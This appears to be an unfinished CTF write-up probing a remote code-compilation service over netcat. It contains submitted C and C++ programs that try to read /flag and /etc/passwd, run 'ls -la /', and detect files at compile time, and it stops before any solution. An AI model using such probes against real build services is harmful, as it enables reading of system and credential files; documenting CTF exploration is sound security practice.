Given netcat connection: `nc 152.118.201.242 9999`

interacting with server, this is how the remote connection work:
```
What's your language?
1. C
2. C++
3. Go
4. Rust
> 1
Input your source code, end it with EOF.
> #include <stdio.h>
> int main() {printf("Hello World\n");return 0;}
> EOF
Compiling...
Successfully compiled!
Provide a URL to receive the binary, we will make a POST request to the provided URL.
```

this seems to have post request to the server, and here i am using webhook to receive the POST request
```
❯ nc 152.118.201.242 9999                                 
What's your language?
1. C
2. C++
3. Go
4. Rust
> 1
Input your source code, end it with EOF.
> #include <stdio.h>
> int main(){printf("Compiler: %s\n", __VERSION__);printf("Date: %s\n", __DATE__);printf("Time: %s\n", __TIME__);printf("File: %s\n", __FILE__);
> 	return 0;
> }
> EOF
Compiling...
Successfully compiled!
Provide a URL to receive the binary, we will make a POST request to the provided URL.
> https://webhook.site/c909cf8f-c8bc-4e3c-a5c0-389a99eda7b5
This URL has no default content configured. <a href="https://webhook.site/#!/view/c909cf8f-c8bc-4e3c-a5c0-389a99eda7b5">View in Webhook.site</a>.
```

the POST uploaded is and ELF binary coded with raw content like this:
```
ELF>`@?6@8
@@@@??((??   \\?-?=?=X`?-?=?=??88800hhhDDS?td88800P?tdx x x 44Q?tdR?td?-?=?=HH/lib64/ld-linux-x86-64.so.2 GNU???GNUZ3??_?|L_????B?H?}$GNU??e?mJ "f u "__cxa_finalize__libc_start_mainprintflibc.so.6GLIBC_2.2.5GLIBC_2.34_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable)ui	3?????=@?=@@??????????????H??H??/H??t??H????5?/??%?/??h???????????%?/D????%u/D??1?I??^H??H???PTE1?1?H?=??S/?f.?H?=y/H?r/H9?tH?6/H??t	?????H?=I/H?5B/H)?H??H???H??H?H??tH?/H??t??fD?????=/u+UH?=?.H??tH?=?.?????d?????.]??????w?????UH??H??H??H??H?Ǹ?????H??H??H??H?Ǹ?????H??H??H??H?Ǹ????H??H??H??H?Ǹ?????]???H??H???11.4.0Compiler: %s
Nov 23 2024Date: %s
02:53:51Time: %s
5b48730697000c57d0ba28a4b9eeca79.cFile: %s
;4????h??????????????P?????zRx?????&D$48??? FJw??:*3$"\0???t(????	????E?C
~@)
??=?=???o???
???P?	???o???o ???o???o???o?=0@GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0??	? ??? ?3I@U?=|@??=??????X!????=?x ???
' e @C@J?Pc@p @? ?@i`&?@?I??@? ?"?Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entry5b48730697000c57d0ba28a4b9eeca79.c__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTable_edata_finiprintf@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used_end__bss_startmain__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#8806hh$I?? W???o??$a???i???q???o~???o  0?PP??B??   ?@@?PP?``p???
?  u?x x 4?? ? ???=?-??=?-??=?-?????/H@0@000+@0`	?3??5
```

lets try another enumeration

when trying to run C++ with directory listing, the result is more interesting
```C++
#include <iostream>
#include <fstream>
#include <filesystem>
#include <cstdlib>

int main() {
    // Try to read flag file directly
    std::ifstream flag("/flag");
    if(flag.is_open()) {
        std::string content;
        while(getline(flag, content)) {
            std::cout << content << std::endl;
        }
        flag.close();
    }
    
    // List current directory
    std::cout << "Directory listing:" << std::endl;
    try {
        for(const auto& entry : std::filesystem::directory_iterator(".")) {
            std::cout << entry.path() << std::endl;
        }
    } catch(...) {
        std::cout << "Failed to list directory" << std::endl;
    }

    // Try to read /etc/passwd
    std::ifstream passwd("/etc/passwd");
    if(passwd.is_open()) {
        std::string line;
        while(getline(passwd, line)) {
            std::cout << line << std::endl;
        }
        passwd.close();
    }

    // Try system command
    system("ls -la /");
    
    return 0;
}
```

given hint about time execution, i found this writeup in ctftime https://ctftime.org/writeup/17929 

```
❯ nc 152.118.201.242 9999                                                    ─╯


What's your language?
1. C
2. C++
3. Go
4. Rust
> 1
Input your source code, end it with EOF.
> #include <stdio.h>

// Compile-time constant computation
static const char test[] = __FILE__;
static const char time[] = __TIME__;
static const char date[] = __DATE__;

int main() {
    printf("%s %s %s\n", test, time, date);
    return 0;
}> > > > > > > > > >
> EOF
Compiling...
Successfully compiled!
Provide a URL to receive the binary, we will make a POST request to the provided URL.
> https://webhook.site/c909cf8f-c8bc-4e3c-a5c0-389a99eda7b5
This URL has no default content configured. <a href="https://webhook.site/#!/view/c909cf8f-c8bc-4e3c-a5c0-389a99eda7b5">View in Webhook.site</a>.
```

looks like the compile-time execution is working
```
What's your language?
1. C
2. C++
3. Go
4. Rust
> 2
Input your source code, end it with EOF.
> #include <stdio.h>

// Simple checks for common files/paths
#if __has_include("flag")
    #warning "Found flag"
#endif

#if __has_include("flag.txt")
    #warning "Found flag.txt"
#endif

#if __has_include("./flag")
    #warning "Found ./flag"
#endif

#if __has_include("/flag")
    #warning "Found /flag"
#endif

#if __has_include("/home/user/flag")
    #warning "Found /home/user/flag"
#endif

#if __has_include("../flag")
    #warning "Found ../flag"
#endif

int main() {
    printf("File check complete\n");
    return 0;
}
```

while trying this, the output shown in ELF is just ''File check complete'' so it was not possible with the method above, but directory listing via printf() is also impossible because the one that i tried resulting in `Directory listing:./etc/passwdls -la /Failed to list directory`

